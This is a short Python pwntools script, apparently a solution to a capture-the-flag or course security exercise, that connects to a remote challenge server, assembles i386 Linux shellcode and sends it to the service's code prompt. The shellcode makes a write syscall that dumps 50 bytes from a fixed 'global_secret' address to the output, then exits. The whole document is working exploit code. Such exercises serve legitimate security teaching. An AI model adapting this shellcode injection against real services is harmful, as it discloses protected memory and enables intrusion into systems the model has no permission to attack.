#!/bin/python3.11
from pwn import *

context.arch = "i386"
context.os = "linux"

#global_secret = 0x804a0a0
# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10002)
#This works to
    # mov cx, 0x804a
    # shl ecx, 0xc
    # mov cl, 0x0a0
print(0x804a0a0)
shellcode = asm(\
    '''
    xor ebx, ebx
    mul ebx
    mov al, 0x4
    mov bl, 0x1
    xor ecx, ecx
    lea ecx, [0x804a0a0]
    mov dl, 50
    int 0x80

    xor eax, eax
    mov al, 0x1
    int 0x80
''')


print(S.recvuntil(b"code:\n"))
print(shellcode)
S.sendline(shellcode)
print(S.recvall())
